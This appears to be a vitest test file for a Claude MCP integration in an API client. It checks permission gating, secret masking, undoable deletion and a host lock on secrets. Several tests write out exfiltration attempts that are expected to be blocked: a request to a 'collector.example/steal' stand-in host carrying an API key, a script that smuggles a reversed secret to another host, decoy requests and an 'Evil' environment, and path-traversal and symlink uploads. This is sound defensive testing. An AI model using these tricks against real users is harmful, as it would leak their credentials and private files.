import { spawn } from 'node:child_process';
import { mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import http from 'node:http';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { createHarness, TOKEN, type Harness } from './harness.ts';

const BRIDGE = join(dirname(fileURLToPath(import.meta.url)), '..', 'bin', 'postguy-mcp.mjs');
const SECRET = 'tok-secret-xyz-123';

let h: Harness;
let url: string;
let client: Client;
let ids: { collection: string; echo: string; env: string };

async function connect() {
  const c = new Client({ name: 'test', version: '1' });
  await c.connect(new StreamableHTTPClientTransport(new URL(`${url}/mcp`), { requestInit: { headers: { Authorization: `Bearer ${TOKEN}` } } }));
  return c;
}

async function tool(name: string, args: Record<string, unknown> = {}) {
  const res = (await client.callTool({ name, arguments: args })) as { isError?: boolean; content: { text: string }[] };
  const text = res.content[0]!.text;
  let value: any = text;
  try {
    value = JSON.parse(text);
  } catch {
    /* an error message */
  }
  return { error: res.isError ? text : null, value };
}

/** Most tests send without naming an environment; the requirement has its own test. */
const allow = (patch: Record<string, boolean>) => h.call('PATCH', '/settings/mcp', { requireEnvironment: false, ...patch });

beforeEach(async () => {
  h = await createHarness();
  await h.app.listen({ port: 0, host: '127.0.0.1' });
  const addr = h.app.server.address();
  url = `http://127.0.0.1:${typeof addr === 'object' && addr ? addr.port : 0}`;
  const col = (await h.call('POST', '/collections', { name: 'Shop', parentId: null })).body;
  await h.call('PUT', `/variables/collection/${col.id}/baseUrl`, { value: h.mockUrl });
  const echo = (
    await h.call('POST', '/requests', {
      collectionId: col.id,
      name: 'Echo',
      method: 'GET',
      url: '{{baseUrl}}/echo',
      headers: [{ id: 'h1', key: 'X-Api-Key', value: '{{apiKey}}', enabled: true }],
    })
  ).body;
  const env = (await h.call('POST', '/environments', { name: 'Local' })).body;
  await h.call('PUT', `/variables/environment/${env.id}`, { variables: [{ key: 'apiKey', value: SECRET, isSecret: true }] });
  await h.call('POST', `/environments/${env.id}/activate`, {});
  ids = { collection: col.id, echo: echo.id, env: env.id };
  client = await connect();
});

afterEach(async () => {
  await client.close();
  await h.close();
});

describe('Claude (MCP) access', () => {
  it('lists its tools but refuses to act until the user turns it on', async () => {
    const { tools } = await client.listTools();
    expect(tools.map((t) => t.name)).toEqual(expect.arrayContaining(['list_requests', 'send_request', 'get_variables', 'decode_jwt', 'create_request', 'run_flow']));
    expect((await tool('list_requests')).error).toMatch(/turned off in Postguy/);
    expect((await h.call('GET', '/settings/mcp')).body).toEqual({ enabled: false, read: true, send: false, edit: false, delete: false, requireEnvironment: true, uploadFolder: null });
  });

  it('gives a Claude Code setup command that runs the bridge', async () => {
    const setup = (await h.call('GET', '/settings/mcp/setup')).body;
    expect(setup.command).toBe('node');
    expect(setup.args[0]).toBe(BRIDGE);
    expect(setup.claudeCode).toBe(`claude mcp add postguy -- node ${BRIDGE}`);
  });

  it('reads with secrets masked, and only sends or edits when allowed', async () => {
    await allow({ enabled: true });
    expect((await tool('list_requests', { query: 'echo' })).value).toEqual([
      { id: ids.echo, name: 'Echo', method: 'GET', url: '{{baseUrl}}/echo', collectionId: ids.collection, folder: 'Shop' },
    ]);
    const vars = (await tool('get_variables', { requestId: ids.echo })).value;
    expect(vars.environment).toBe('Local');
    expect(vars.variables.find((v: any) => v.key === 'apiKey')).toMatchObject({ source: 'environment', secret: true, value: '••••••' });
    expect((await tool('send_request', { requestId: ids.echo })).error).toMatch(/does not allow Claude to send requests/);
    expect((await tool('create_request', { collectionId: ids.collection, name: 'New', url: '/x' })).error).toMatch(/does not allow Claude to change the workspace/);
  });

  it('sends with the secret filled in, masks it in the response and labels the history entry', async () => {
    await allow({ enabled: true, send: true });
    const { value } = await tool('send_request', { requestId: ids.echo });
    expect(value.status).toBe(200);
    expect(JSON.stringify(value)).not.toContain(SECRET);
    expect(value.body).toContain('"x-api-key":"••••••"');
    const [entry] = (await h.call('GET', '/history')).body;
    expect(entry.source).toBe('mcp');
  });

  it('refuses to send a secret to a host the user never sends to', async () => {
    await allow({ enabled: true, send: true });
    const before = (await h.call('GET', '/history')).body.length;
    const res = await tool('send_request', { url: 'https://collector.example/steal', headers: { 'X-Key': '{{apiKey}}' } });
    expect(res.value.error.code).toBe('MCP_SECRET_HOST_BLOCKED');
    expect(res.value.error.message).toMatch(/collector\.example/);
    expect((await h.call('GET', '/history')).body.length).toBe(before);
    const ok = await tool('send_request', { url: `${h.mockUrl}/echo`, headers: { 'X-Key': '{{apiKey}}' } });
    expect(ok.value.status).toBe(200);
  });

  it('keeps blocked environments away from Claude and reveals secrets only where allowed', async () => {
    await allow({ enabled: true, send: true });
    await h.call('PATCH', `/environments/${ids.env}`, { mcpBlocked: true });
    expect((await tool('send_request', { requestId: ids.echo })).error).toMatch(/"Local" is not available to Claude/);
    expect((await tool('get_variables', { requestId: ids.echo })).error).toMatch(/not available to Claude/);
    await h.call('PATCH', `/environments/${ids.env}`, { mcpBlocked: false, mcpRevealSecrets: true });
    const vars = (await tool('get_variables', { requestId: ids.echo })).value;
    expect(vars.variables.find((v: any) => v.key === 'apiKey').value).toBe(SECRET);
  });

  it('decodes a JWT without returning the token or signature', async () => {
    await allow({ enabled: true });
    const part = (o: object) => Buffer.from(JSON.stringify(o)).toString('base64url');
    const jwt = `${part({ alg: 'HS256', typ: 'JWT' })}.${part({ sub: 'u1', scope: 'read', exp: 2_000_000_000 })}.c2lnbmF0dXJlLXNlY3JldA`;
    await h.call('PUT', `/variables/environment/${ids.env}/jwt`, { value: jwt, isSecret: true });
    const { value } = await tool('decode_jwt', { variable: 'jwt' });
    expect(value).toMatchObject({ header: { alg: 'HS256' }, claims: { sub: 'u1', scope: 'read' }, expired: false, expiresAt: '2033-05-18T03:33:20.000Z' });
    expect(JSON.stringify(value)).not.toContain('c2lnbmF0dXJlLXNlY3JldA');
    expect(JSON.stringify(value)).not.toContain(jwt);
  });

  it('edits the workspace when allowed, never echoing secret values', async () => {
    await allow({ enabled: true, edit: true });
    const created = (await tool('create_request', { collectionId: ids.collection, name: 'Health', url: '{{baseUrl}}/health', headers: { Accept: 'application/json' } })).value;
    expect(created).toMatchObject({ name: 'Health', method: 'GET', url: '{{baseUrl}}/health' });
    const set = (await tool('set_variable', { scope: 'environment', key: 'other', value: 'shh', secret: true })).value;
    expect(set).toEqual({ key: 'other', scope: 'environment', secret: true, value: '••••••' });
    expect((await tool('set_active_environment', { environment: null })).value).toEqual({ active: null });
  });

  it('runs a flow and returns its report', async () => {
    await allow({ enabled: true, send: true });
    const flow = (await h.call('POST', '/flows', { name: 'Check', collectionId: ids.collection })).body;
    await h.call('PUT', `/flows/${flow.id}/graph`, { steps: [{ id: 's1', name: 'Echo', kind: 'request', requestId: ids.echo }], connections: [] });
    const { value } = await tool('run_flow', { flowId: flow.id });
    expect(value.status).toBe('success');
    expect(JSON.stringify(value)).not.toContain(SECRET);
    expect((await h.call('GET', '/history')).body[0].source).toBe('mcp');
  });
});

describe('postguy-mcp bridge', () => {
  const run = (dataDir: string, lines: object[]) =>
    new Promise<any[]>((resolve, reject) => {
      const child = spawn(process.execPath, [BRIDGE, '--data-dir', dataDir]);
      const out: any[] = [];
      let buf = '';
      child.stdout.on('data', (d) => {
        buf += d;
        let i;
        while ((i = buf.indexOf('\n')) >= 0) {
          out.push(JSON.parse(buf.slice(0, i)));
          buf = buf.slice(i + 1);
          if (out.length === lines.filter((l: any) => l.id !== undefined).length) {
            child.kill();
            resolve(out);
          }
        }
      });
      child.on('error', reject);
      for (const l of lines) child.stdin.write(`${JSON.stringify(l)}\n`);
      setTimeout(() => {
        child.kill();
        resolve(out);
      }, 8000);
    });

  it('relays stdio JSON-RPC to the running app found through server.json', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'postguy-mcp-'));
    writeFileSync(join(dir, 'server.json'), JSON.stringify({ url, token: TOKEN, pid: process.pid }));
    const out = await run(dir, [
      { jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 't', version: '1' } } },
      { jsonrpc: '2.0', method: 'notifications/initialized' },
      { jsonrpc: '2.0', id: 2, method: 'tools/list' },
    ]);
    rmSync(dir, { recursive: true, force: true });
    expect(out[0]).toMatchObject({ id: 1, result: { serverInfo: { name: 'postguy' } } });
    expect(out[1].id).toBe(2);
    expect(out[1].result.tools.map((t: any) => t.name)).toContain('send_request');
  });

  it("answers with a clear error when Postguy isn't running", async () => {
    const dir = mkdtempSync(join(tmpdir(), 'postguy-mcp-'));
    const out = await run(dir, [{ jsonrpc: '2.0', id: 7, method: 'tools/list' }]);
    rmSync(dir, { recursive: true, force: true });
    expect(out).toEqual([{ jsonrpc: '2.0', id: 7, error: { code: -32000, message: "Postguy isn't running. Open Postguy and try again." } }]);
  });
});

describe('Claude (MCP) secret handling', () => {
  const other = () => h.mockUrl.replace('127.0.0.1', 'localhost');

  it("can't open the host lock by saving a request or variable that points elsewhere", async () => {
    await allow({ enabled: true, read: true, send: true, edit: true });
    const steal = { requestId: ids.echo, url: `${other()}/echo` };
    expect((await tool('send_request', steal)).value.error.code).toBe('MCP_SECRET_HOST_BLOCKED');
    await tool('set_variable', { scope: 'collection', owner: ids.collection, key: 'mirror', value: other() });
    await tool('create_request', { collectionId: ids.collection, name: 'Decoy', url: `${other()}/x` });
    expect((await tool('send_request', steal)).value.error.code).toBe('MCP_SECRET_HOST_BLOCKED');

    // Once the user sends there themselves, it is their host again.
    const decoy = (await h.call('GET', '/collections/tree')).body[0].requests.find((r: any) => r.name === 'Decoy');
    await h.call('POST', '/send', { requestId: decoy.id, collectionId: ids.collection, request: (await h.call('GET', `/requests/${decoy.id}`)).body });
    expect((await tool('send_request', steal)).value.status).toBe(200);
  });

  it('marks an edited host untrusted even when the edit fails after saving', async () => {
    await allow({ enabled: true, read: true, send: true, edit: true });
    const prod = (await h.call('POST', '/environments', { name: 'Prod' })).body;
    await h.call('POST', `/environments/${prod.id}/activate`, {});
    await h.call('PATCH', `/environments/${prod.id}`, { mcpBlocked: true });
    expect((await tool('update_request', { id: ids.echo, url: `${other()}/echo` })).error).toMatch(/not available to Claude/);
    expect((await h.call('GET', `/requests/${ids.echo}`)).body.url).toBe('{{baseUrl}}/echo');
    await tool('create_request', { collectionId: ids.collection, name: 'Decoy', url: `${other()}/x` });
    expect((await tool('send_request', { requestId: ids.echo, url: `${other()}/echo`, environment: 'Local' })).value.error.code).toBe('MCP_SECRET_HOST_BLOCKED');
  });

  it('checks the OAuth token URL before sending client credentials there', async () => {
    await allow({ enabled: true, read: true, send: true, edit: true });
    await h.call('PATCH', `/requests/${ids.echo}`, {
      headers: [],
      auth: { type: 'oauth2', grantType: 'client_credentials', tokenUrl: '{{authUrl}}/token', clientId: 'cid', clientSecret: '{{apiKey}}' },
    });
    await tool('set_variable', { scope: 'collection', owner: ids.collection, key: 'authUrl', value: other() });
    const res = (await tool('send_request', { requestId: ids.echo })).value;
    expect(res.error.code).toBe('MCP_SECRET_HOST_BLOCKED');
    expect(res.error.message).toMatch(/localhost/);
  });

  it("hides secrets from the scripts Claude runs, so they can't pass them on in any form", async () => {
    await allow({ enabled: true, read: true, send: true });
    const pre = `const s = pm.environment.get('apiKey');
pm.test('spaced ' + s.split('').join(' '), () => {});
const r = await pm.sendRequest('${other()}/echo?d=' + s.split('').reverse().join(''));
pm.test('echo ' + JSON.stringify(r.json()), () => {});`;
    await h.call('PATCH', `/requests/${ids.echo}`, { scripts: { pre, post: `pm.test('sent ' + pm.request.headers.get('X-Api-Key').split('').join(' '), () => {});` } });
    const res = await tool('send_request', { requestId: ids.echo });
    expect(res.value.status).toBe(200);
    const text = JSON.stringify(res.value);
    const reversed = SECRET.split('').reverse().join('');
    expect(text).not.toContain(reversed);
    expect(text).not.toContain(SECRET.split('').join(' '));
    expect(res.value.tests.map((t: any) => t.name)).toContain(`spaced ${'••••••'.split('').join(' ')}`);
    const echoed = await tool('list_history', { limit: 5 });
    expect(JSON.stringify(echoed.value)).not.toContain(reversed);

    // The user's own sends still give scripts the real value.
    const mine = (await h.call('POST', '/send', { requestId: ids.echo, environmentId: ids.env, request: (await h.call('GET', `/requests/${ids.echo}`)).body })).body;
    expect(mine.scripts[0].assertions[0].message).toBe(`spaced ${SECRET.split('').join(' ')}`);
  });

  it('masks a secret that was URL-encoded into the query', async () => {
    await allow({ enabled: true, read: true, send: true });
    await h.call('PUT', `/variables/environment/${ids.env}`, {
      variables: [
        { key: 'apiKey', value: SECRET, isSecret: true },
        { key: 'b64', value: 'ab+cd/ef9==', isSecret: true },
      ],
    });
    const sent = await tool('send_request', { requestId: ids.echo, params: { k: '{{b64}}' } });
    expect(sent.value.status).toBe(200);
    const entry = await tool('get_history_entry', { id: sent.value.historyId });
    for (const v of [sent.value, entry.value]) expect(JSON.stringify(v)).not.toMatch(/ab%2Bcd|ab\+cd/);
  });

  it('masks request secrets, literal credentials and secrets in history bodies', async () => {
    await allow({ enabled: true, read: true, send: true });
    await h.call('PUT', `/variables/request/${ids.echo}`, { variables: [{ key: 'reqSecret', value: 'REQSECRET-xyz', isSecret: true }] });
    await h.call('PATCH', `/requests/${ids.echo}`, {
      headers: [{ id: 'h1', key: 'X-Req', value: '{{reqSecret}}', enabled: true }],
      auth: { type: 'bearer', token: 'LITERAL-TOKEN-999' },
    });
    const vars = (await tool('get_variables', { requestId: ids.echo })).value.variables;
    expect(vars.find((v: any) => v.key === 'reqSecret').value).toBe('••••••');
    const req = (await tool('get_request', { id: ids.echo })).value;
    expect(JSON.stringify(req)).not.toContain('LITERAL-TOKEN-999');
    const sent = await tool('send_request', { requestId: ids.echo });
    expect(sent.error).toBeNull();
    expect(JSON.stringify(sent.value)).not.toMatch(/REQSECRET-xyz|LITERAL-TOKEN-999/);
    const entry = await tool('get_history_entry', { id: sent.value.historyId });
    expect(JSON.stringify(entry.value)).not.toMatch(/REQSECRET-xyz|LITERAL-TOKEN-999/);
  });

  it('keeps working when a secret looks like a number or true', async () => {
    await allow({ enabled: true, read: true, send: true });
    await h.call('PUT', `/variables/collection/${ids.collection}/pin`, { value: '200', isSecret: true });
    await h.call('PUT', `/variables/collection/${ids.collection}/flag`, { value: 'true', isSecret: true });
    const sent = await tool('send_request', { requestId: ids.echo });
    expect(sent.error).toBeNull();
    expect(sent.value.status).toBe(200);
    expect((await tool('get_request', { id: ids.echo })).error).toBeNull();
  });
});

describe('Claude (MCP) deleting', () => {
  it('needs its own permission, and every deletion can be undone', async () => {
    await allow({ enabled: true, read: true, edit: true });
    expect((await tool('delete_request', { id: ids.echo })).error).toMatch(/does not allow Claude to delete/);
    await allow({ delete: true, edit: false });
    expect((await tool('delete_request', { id: ids.echo })).error).toMatch(/does not allow Claude to delete/);
    await allow({ edit: true });

    const done = (await tool('delete_request', { id: ids.echo })).value;
    expect(done).toMatchObject({ deleted: 'Echo', changeId: expect.any(String) });
    expect((await h.call('GET', `/requests/${ids.echo}`)).status).toBe(404);
    const [change] = (await h.call('GET', `/collections/${ids.collection}/changes`)).body;
    expect(change).toMatchObject({ action: 'delete', source: 'mcp', id: done.changeId });

    expect((await tool('restore_change', { changeId: done.changeId })).value.message).toMatch(/Brought back/);
    expect((await h.call('GET', `/requests/${ids.echo}`)).body.name).toBe('Echo');
  });

  it('deletes a folder or collection, but not one holding more than 50 requests', async () => {
    await allow({ enabled: true, read: true, edit: true, delete: true });
    const big = (await h.call('POST', '/collections', { name: 'Big', parentId: ids.collection })).body;
    for (let i = 0; i < 51; i++) await h.call('POST', '/requests', { collectionId: big.id, name: `R${i}`, method: 'GET', url: 'http://x' });
    expect((await tool('delete_folder', { id: big.id })).error).toMatch(/holds 51 requests/);
    expect((await tool('delete_folder', { id: ids.collection })).error).toMatch(/holds 52 requests/);
    await h.call('DELETE', `/requests/${(await h.call('GET', '/collections/tree')).body[0].children[0].requests[0].id}`);
    const done = (await tool('delete_folder', { id: big.id })).value;
    expect(done).toMatchObject({ deleted: 'Big', kind: 'folder', requests: 50 });
    await tool('restore_change', { changeId: done.changeId });
    expect((await h.call('GET', '/collections/tree')).body[0].children[0].requests).toHaveLength(50);
  });
});

describe('Claude (MCP) folders', () => {
  it('creates, renames and lists folders, including empty ones', async () => {
    await allow({ enabled: true, read: true, edit: true });
    const folder = (await tool('create_folder', { name: 'Users', parentId: ids.collection })).value;
    expect(folder).toMatchObject({ name: 'Users', kind: 'folder', parentId: ids.collection });
    const top = (await tool('create_folder', { name: 'Admin API' })).value;
    expect(top).toMatchObject({ kind: 'collection', parentId: null });
    await tool('rename_folder', { id: folder.id, name: 'People' });
    const tree = (await tool('list_folders')).value;
    expect(tree.find((c: any) => c.id === ids.collection).folders).toEqual([{ id: folder.id, name: 'People', kind: 'folder', requests: 0 }]);
    expect(tree.find((c: any) => c.id === top.id)).toMatchObject({ name: 'Admin API', requests: 0 });
    const [change] = (await h.call('GET', `/collections/${ids.collection}/changes`)).body;
    expect(change).toMatchObject({ source: 'mcp', label: 'People' });
  });

  it('moves requests and folders, and says when a request will behave differently', async () => {
    await allow({ enabled: true, read: true, edit: true });
    const folder = (await tool('create_folder', { name: 'Users', parentId: ids.collection })).value;
    const moved = (await tool('move', { id: ids.echo, to: folder.id })).value;
    expect(moved).toMatchObject({ moved: 'Echo', kind: 'request', to: 'Shop / Users', notes: [] });

    const other = (await tool('create_folder', { name: 'Other' })).value;
    const away = (await tool('move', { id: ids.echo, to: other.id })).value;
    expect(away.notes).toEqual(expect.arrayContaining(['{{baseUrl}} is not defined here.']));

    expect((await tool('move', { id: folder.id, to: other.id })).value).toMatchObject({ moved: 'Users', kind: 'folder', to: 'Other' });
    expect((await tool('move', { id: other.id, to: folder.id })).error).toMatch(/into itself/);
    expect((await tool('move', { id: folder.id })).value).toMatchObject({ kind: 'collection', to: '(top level)' });
    expect((await tool('move', { id: ids.echo })).error).toMatch(/has to go into a collection or folder/);
  });
});

describe('Claude (MCP) moving several at once', () => {
  it('moves them all or none, reports once, and undoes the batch in one call', async () => {
    await allow({ enabled: true, read: true, edit: true });
    const extra = [];
    for (const name of ['A', 'B', 'C']) extra.push((await h.call('POST', '/requests', { collectionId: ids.collection, name, method: 'GET', url: '{{baseUrl}}/x' })).body.id);
    const other = (await tool('create_folder', { name: 'Other' })).value;

    const bad = await tool('move', { ids: [...extra, 'nope'], to: other.id });
    expect(bad.error).toMatch(/Nothing was moved\. nope: no such request or folder/);
    expect((await h.call('GET', `/requests/${extra[0]}`)).body.collectionId).toBe(ids.collection);

    const done = (await tool('move', { ids: extra, to: other.id })).value;
    expect(done.moved.map((m: any) => m.name)).toEqual(['A', 'B', 'C']);
    expect(done.notes).toEqual(['{{baseUrl}} is not defined here. (3 requests: A, B, C)']);
    for (const r of extra) expect((await h.call('GET', `/requests/${r}`)).body.collectionId).toBe(other.id);

    const undone = (await tool('restore_change', { changeIds: done.moved.map((m: any) => m.changeId) })).value;
    expect(undone).toHaveLength(3);
    expect(undone.every((u: any) => !u.error)).toBe(true);
    for (const r of extra) expect((await h.call('GET', `/requests/${r}`)).body.collectionId).toBe(ids.collection);
  });
});

describe('Claude (MCP) move edge cases', () => {
  const curlAuth = async (id: string) => {
    const r = (await h.call('GET', `/requests/${id}`)).body;
    return /Authorization: (\w+)/.exec((await h.call('POST', '/export/curl', { request: r, collectionId: r.collectionId, requestId: id })).body.command)?.[1] ?? 'none';
  };

  it('never hands back a changeId that would undo someone else’s edit', async () => {
    await allow({ enabled: true, read: true, edit: true });
    const other = (await tool('create_folder', { name: 'Other' })).value;
    await h.call('PATCH', `/requests/${ids.echo}`, { url: 'http://changed' });

    const stay = (await tool('move', { id: ids.echo, to: ids.collection })).value;
    expect(stay).toMatchObject({ moved: null, alreadyThere: [ids.echo] });

    const away = (await tool('move', { id: ids.echo, to: other.id })).value;
    const back = (await tool('move', { id: ids.echo, to: ids.collection })).value;
    expect(back.changeId).not.toBe(away.changeId);
    await tool('restore_change', { changeId: back.changeId });
    const r = (await h.call('GET', `/requests/${ids.echo}`)).body;
    expect(r).toMatchObject({ collectionId: other.id, url: 'http://changed' });
  });

  it('reports auth changes for requests inside a moved folder, and an accurate note for a collection moved into a folder', async () => {
    await allow({ enabled: true, read: true, edit: true });
    const p = (await h.call('POST', '/collections', { name: 'P', parentId: null, auth: { type: 'bearer', token: 'tok-1234' } })).body;
    const f = (await h.call('POST', '/collections', { name: 'F', parentId: p.id })).body;
    const r = (await h.call('POST', '/requests', { collectionId: f.id, name: 'R', method: 'GET', url: 'https://example.com/r' })).body;
    expect(await curlAuth(r.id)).toBe('Bearer');
    const top = (await tool('move', { id: f.id })).value;
    expect(top.notes).toEqual(['Auth changes from bearer to none.']);
    expect(await curlAuth(r.id)).toBe('none');

    const c = (await h.call('POST', '/collections', { name: 'C', parentId: null })).body;
    await h.call('POST', '/requests', { collectionId: c.id, name: 'RC', method: 'GET', url: 'https://example.com/rc' });
    const into = (await tool('move', { id: c.id, to: p.id })).value;
    expect(into.notes).toEqual([`"C" keeps its own auth (none), so its requests don't use the auth of the folders above it; set it to inherit to use theirs.`]);
  });

  it('rejects an empty destination and more than 50 items in all', async () => {
    await allow({ enabled: true, read: true, edit: true });
    expect((await tool('move', { id: ids.echo, to: '' })).error).toMatch(/too small|at least 1|>=1/i);
    const many = Array.from({ length: 50 }, (_, i) => `x${i}`);
    expect((await tool('move', { id: ids.echo, ids: many, to: ids.collection })).error).toMatch(/at most 50 items at once; this call has 51/);
  });

  it('refuses to undo a folder move when the folder it came from is gone', async () => {
    await allow({ enabled: true, read: true, edit: true, delete: true });
    const x = (await tool('create_folder', { name: 'X' })).value;
    const t = (await tool('create_folder', { name: 'T' })).value;
    const f = (await tool('create_folder', { name: 'F', parentId: x.id })).value;
    const moved = (await tool('move', { id: f.id, to: t.id })).value;
    await tool('delete_folder', { id: x.id });
    expect((await tool('restore_change', { changeId: moved.changeId })).error).toMatch(/restore that folder first/);
    expect((await h.call('GET', `/collections/${f.id}`)).body.parentId).toBe(t.id);
  });
});

describe('Claude (MCP) environments', () => {
  it('must name the environment for sends and environment writes, unless the user allows the active one', async () => {
    await allow({ enabled: true, read: true, send: true, edit: true, requireEnvironment: true });
    for (const [name, args] of [
      ['send_request', { requestId: ids.echo }],
      ['set_variable', { scope: 'environment', key: 'k', value: 'v' }],
    ] as const)
      expect((await tool(name, args)).error).toMatch(/Name the environment/);
    expect((await tool('send_request', { requestId: ids.echo, environment: 'Local' })).value.status).toBe(200);
    expect((await tool('get_variables', { requestId: ids.echo })).error).toBeNull();
    await allow({ enabled: true, send: true, requireEnvironment: false });
    expect((await tool('send_request', { requestId: ids.echo })).value.status).toBe(200);
  });

  it('creates an environment with variables, keeping secrets hidden, and only with Edit', async () => {
    await allow({ enabled: true, read: true });
    expect((await tool('create_environment', { name: 'Staging' })).error).toMatch(/does not allow Claude to change/);
    await allow({ enabled: true, read: true, edit: true });
    const res = await tool('create_environment', {
      name: 'Staging',
      variables: [
        { key: 'host', value: 'https://staging.example.com' },
        { key: 'password', value: 'pw-STAGING-1', secret: true },
      ],
      activate: true,
    });
    expect(res.error).toBeNull();
    expect(JSON.stringify(res.value)).not.toContain('pw-STAGING-1');
    const env = (await h.call('GET', '/environments')).body.find((e: any) => e.name === 'Staging');
    expect(env.isActive).toBe(true);
    const vars = (await h.call('GET', `/variables/environment/${env.id}?reveal=1`)).body;
    expect(vars.map((v: any) => [v.key, v.value, v.isSecret])).toEqual([
      ['host', 'https://staging.example.com', false],
      ['password', 'pw-STAGING-1', true],
    ]);
    expect((await tool('create_environment', { name: 'staging' })).error).toMatch(/already exists/);
  });

  it('clones an environment with its keys, leaving secret values empty', async () => {
    await allow({ enabled: true, read: true, edit: true });
    await h.call('PUT', `/variables/environment/${ids.env}`, {
      variables: [
        { key: 'apiKey', value: SECRET, isSecret: true },
        { key: 'host', value: 'https://preprod.example.com' },
      ],
    });
    const res = await tool('clone_environment', { from: 'Local', name: 'Staging' });
    expect(res.value.note).toMatch(/apiKey/);
    const env = (await h.call('GET', '/environments')).body.find((e: any) => e.name === 'Staging');
    const vars = (await h.call('GET', `/variables/environment/${env.id}?reveal=1`)).body;
    expect(vars.map((v: any) => [v.key, v.value, v.isSecret])).toEqual([
      ['apiKey', '', true],
      ['host', 'https://preprod.example.com', false],
    ]);
    await tool('clone_environment', { from: 'Local', name: 'Keys only', values: false });
    const keys = (await h.call('GET', '/environments')).body.find((e: any) => e.name === 'Keys only');
    expect((await h.call('GET', `/variables/environment/${keys.id}?reveal=1`)).body.map((v: any) => v.value)).toEqual(['', '']);
  });

  it('warns when Claude stores a credential as plain text', async () => {
    await allow({ enabled: true, read: true, edit: true });
    const made = await tool('create_environment', { name: 'Staging', variables: [{ key: 'host', value: 'h' }, { key: 'password', value: 'pw1' }] });
    expect(made.value.warning).toMatch(/^password looks like a credential/);
    const set = await tool('set_variable', { scope: 'environment', owner: 'Staging', key: 'auth_token', value: 'tok' });
    expect(set.value.warning).toMatch(/auth_token looks like a credential/);
    expect((await tool('set_variable', { scope: 'environment', owner: 'Staging', key: 'auth_token', value: 'tok', secret: true })).value.warning).toBeUndefined();
  });

  it("won't clone an environment the user keeps from Claude", async () => {
    await allow({ enabled: true, read: true, edit: true });
    await h.call('PATCH', `/environments/${ids.env}`, { mcpBlocked: true });
    expect((await tool('clone_environment', { from: 'Local', name: 'Copy' })).error).toMatch(/not available to Claude/);
  });

  it('treats a host in a new environment as untrusted for secrets', async () => {
    await allow({ enabled: true, read: true, send: true, edit: true });
    const other = h.mockUrl.replace('127.0.0.1', 'localhost');
    const global = (await h.call('GET', '/environments')).body.find((e: any) => e.kind === 'global');
    await h.call('PUT', `/variables/global/${global.id}`, { variables: [{ key: 'apiKey', value: SECRET, isSecret: true }] });
    await tool('create_environment', { name: 'Evil', variables: [{ key: 'mirror', value: other }] });
    const res = await tool('send_request', { requestId: ids.echo, url: `${other}/echo`, environment: 'Evil' });
    expect(res.value.error?.code).toBe('MCP_SECRET_HOST_BLOCKED');
  });
});

describe('Claude (MCP) file uploads', () => {
  let dir: string;
  let outside: string;
  let sink: http.Server;
  let sinkUrl = '';
  let last: string | null = null;
  beforeEach(async () => {
    dir = mkdtempSync(join(tmpdir(), 'postguy-up-'));
    outside = mkdtempSync(join(tmpdir(), 'postguy-out-'));
    writeFileSync(join(dir, 'users.csv'), 'email\nann@x.test\n');
    writeFileSync(join(outside, 'private.txt'), 'do not send');
    symlinkSync(join(outside, 'private.txt'), join(dir, 'link.txt'));
    sink = http.createServer((req, res) => {
      let b = '';
      req.on('data', (c) => (b += c));
      req.on('end', () => {
        last = b;
        res.end('ok');
      });
    });
    await new Promise<void>((r) => sink.listen(0, '127.0.0.1', () => r()));
    const addr = sink.address();
    sinkUrl = `http://127.0.0.1:${typeof addr === 'object' && addr ? addr.port : 0}/import`;
    last = null;
  });
  afterEach(async () => {
    await new Promise((r) => sink.close(r));
    rmSync(dir, { recursive: true, force: true });
    rmSync(outside, { recursive: true, force: true });
  });
  const upload = (files: Record<string, string>) => tool('send_request', { url: sinkUrl, method: 'POST', body: { mode: 'form', form: { note: 'hi' }, files } });

  it('uploads form-data files only from the folder the user allowed', async () => {
    await allow({ enabled: true, read: true, send: true });
    expect((await upload({ file: join(dir, 'users.csv') })).value.error.message).toMatch(/may not upload files/);
    expect(last).toBeNull();

    await h.call('PATCH', '/settings/mcp', { uploadFolder: dir });
    const ok = await upload({ file: 'users.csv' });
    expect(ok.value.status).toBe(200);
    expect(last).toContain('name="note"');
    expect(last).toContain('filename="users.csv"');
    expect(last).toContain('ann@x.test');

    last = null;
    for (const path of [join(outside, 'private.txt'), '../' + outside.split('/').pop() + '/private.txt', 'link.txt']) {
      const res = await upload({ file: path });
      expect(res.value.error.code, path).toBe('FILE_NOT_ALLOWED');
    }
    expect(last).toBeNull();
  });

  it('sends a binary body from the upload folder', async () => {
    await allow({ enabled: true, read: true, send: true });
    await h.call('PATCH', '/settings/mcp', { uploadFolder: dir });
    const res = await tool('send_request', { url: sinkUrl, method: 'POST', body: { mode: 'binary', file: 'users.csv' } });
    expect(res.value.status).toBe(200);
    expect(last).toBe('email\nann@x.test\n');
  });
});

describe('Claude (MCP) and pm.sendRequest', () => {
  it('applies the secret host lock to requests a script sends', async () => {
    await allow({ enabled: true, read: true, send: true });
    const other = h.mockUrl.replace('127.0.0.1', 'localhost');
    await h.call('PATCH', `/requests/${ids.echo}`, { scripts: { pre: `await pm.sendRequest({ url: '${other}/echo', header: { 'X-Key': '{{apiKey}}' } });`, post: '' } });
    const res = (await tool('send_request', { requestId: ids.echo })).value;
    expect(res.error.message).toMatch(/would carry a secret/);
    await h.call('PATCH', `/requests/${ids.echo}`, { scripts: { pre: `await pm.sendRequest('${other}/echo');`, post: '' } });
    expect((await tool('send_request', { requestId: ids.echo })).value.status).toBe(200);
  });
});
